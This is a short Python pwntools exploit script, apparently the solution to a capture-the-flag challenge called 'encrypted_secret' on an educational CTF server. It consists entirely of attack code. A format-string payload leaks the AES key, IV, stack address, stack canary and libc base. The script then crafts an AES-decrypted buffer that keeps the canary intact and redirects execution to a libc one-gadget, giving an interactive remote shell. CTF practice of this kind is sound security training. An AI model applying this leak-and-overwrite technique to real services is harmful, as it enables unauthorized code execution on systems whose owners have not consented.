from pwn import *
from Crypto.Cipher import AES
def pad(s):
    p = 16 - len(s) % 16
    return s + chr(p) * p
def xor(x,y):
    ret = ""
    for i in range(len(x)):
        ret += chr(ord(x[i])^ord(y[i]))
    return ret

#data = aes.encrypt(pad(b'aaaaaa\n'))


#r =  process(["./encrypted_secret"])
r = remote("edu-ctf.zoolab.org", 9487)
context.arch = "amd64"

payload = "%13$s%14$p_%15$p_%17$p_"
assert( len(payload) <= 0x38 )
payload = payload.ljust(0x38,"\x00")+flat(0x603030)

r.sendlineafter(":",payload[:62])
r.recvuntil("Hi ")
key = r.recvn(16)
iv = r.recvn(16)
print key.encode("hex")
print iv.encode("hex")
aes = AES.new(key, AES.MODE_ECB)
stack = int(r.recvuntil("_")[:-1],16)
canary = int(r.recvuntil("_")[:-1],16)
libc = int(r.recvuntil("_")[:-1],16)-0x21b97
print hex(stack)
print hex(canary)
print hex(libc)

context.arch = "amd64"
data = aes.decrypt(flat(canary,stack-0x1c0))
Y = xor(data,"\x10"*16)
data = aes.decrypt(Y)
aes = AES.new(key, AES.MODE_CBC,iv)
ans = flat(canary,0x0,libc+0x4f322).ljust(0x70,'\x00')
sol = aes.decrypt(ans)
sol += xor(data,ans[-0x10:])
#input(":")
r.send(sol)

r.interactive()
